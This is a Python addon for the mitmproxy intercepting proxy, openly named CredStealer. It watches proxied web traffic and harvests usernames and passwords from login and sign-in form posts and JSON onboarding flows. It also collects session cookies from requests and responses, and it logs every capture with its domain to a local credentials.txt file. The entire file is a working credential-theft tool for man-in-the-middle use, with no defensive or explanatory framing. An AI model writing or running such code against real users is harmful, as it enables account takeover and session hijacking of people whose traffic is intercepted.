from mitmproxy import http
from datetime import datetime


class CredStealer:
    creds_dict = []
    json_user = None
    json_pswd = None
    cred_text = open("credentials.txt", "a")

    def load(self, loader):
        now = datetime.now()
        self.cred_text.write(f"\nStealing Credentials Time: {now}\n")
        self.cred_text.close()

    def response(self, flow: http.HTTPFlow):
        self.cred_text = open("credentials.txt", "a")
        # Sign ins that do both parts at once
        url = flow.request.url
        if "login" in url or "signin" in url:
            form_data = flow.request.urlencoded_form
            origin = flow.request.headers["origin"]
            user = None
            pswd = None
            for key, value in form_data.items():
                if "pass" in key:
                    pswd = value
                elif "email" in key or "user" in key or "iden" in key:
                    user = value
            if user != None and pswd != None and (user, pswd) not in self.creds_dict:
                self.cred_text.write(f"Domain: {origin}\n")
                self.cred_text.write(f"User: {user}\nPassword: {pswd}\n")
                self.creds_dict.append((user, pswd))

        # Session cookies
        request_cookies = flow.request.cookies.items()
        response_cookies = flow.response.cookies.items()
        for key, value in request_cookies:
            if (key, value) not in self.creds_dict and ("sess" in key):
                self.cred_text.write(f"Possible session: {value}\n")
                self.creds_dict.append((key, value))
        for key, value in response_cookies:
            if (key, value) not in self.creds_dict and ("sess" in key):
                self.cred_text.write(f"Possible session: {value}\n")
                self.creds_dict.append((key, value))

        # JSON flow sign ins
        if "onboard" in url and flow.response.status_code < 400:
            text = flow.request.text.split(":")
            origin = flow.request.headers["origin"]
            if self.json_user == None and "user_identifier" in flow.request.text:
                for i in range(0, len(text) - 1, 1):
                    key = text[i]
                    val = text[i + 1]
                    if "result" in key:
                        self.json_user = val.split('"')[1]
                        break
            elif self.json_pswd == None:
                for i in range(0, len(text) - 1, 1):
                    key = text[i]
                    val = text[i + 1]
                    if "password" in key and "enter" not in key:
                        self.json_pswd = val.split('"')[1]
                        break
                if self.json_pswd != None:
                    self.cred_text.write(f"Domain: {origin}\n")
                    self.cred_text.write(f"User: {self.json_user}\nPassword: {self.json_pswd}\n")
                    self.creds_dict.append((self.json_user, self.json_pswd))
                    self.json_user = None
                    self.json_pswd = None


addons = [
    CredStealer()
]
